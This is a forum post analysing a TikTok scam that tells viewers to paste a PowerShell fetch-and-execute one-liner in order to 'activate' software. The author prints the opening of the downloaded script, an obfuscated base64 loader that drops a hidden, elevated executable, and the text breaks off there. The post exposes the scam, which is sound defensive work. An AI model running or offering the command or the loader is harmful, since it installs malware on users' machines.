<!-- SC_OFF --><div class="md"><p>I have very recently come across a TikTok (user: theshellshield ) account claiming to be able to activate certain software. I knew that this was nonsense. It was clear that it was relying on people who did not know what they were doing typing stuff into the PowerShell and running it. The videos led the user to type <code>iwr &quot;windows.keytool.cc | iex</code> which downloaded and ran a script.</p> <p>To see what was happening here I loaded up a Linux VM and used <code>iwr &quot;windows.keytool.cc&quot; -OutFile &quot;/home/user/output.txt&quot;</code> to have a look at the code.</p> <p>Here is what i got:</p> <pre><code>$downloadUrlB64 = &quot;aHR0cHM6Ly9henNvbHZlci5jb20vZmlsZXMvbWFpbi5leGU=&quot; $updaterExeB64 = &quot;dXBkYXRlci5leGU=&quot; $hiddenAttrB64 = &quot;SGlkZGVu&quot; $silentlyContinueB64 = &quot;U2lsZW50bHljb250aW51ZQ==&quot; $stopActionB64 = &quot;U3RvcA==&quot; $directoryB64 = &quot;RGlyZWN0b3J5&quot; $runAsB64 = &quot;UnVuQXM=&quot
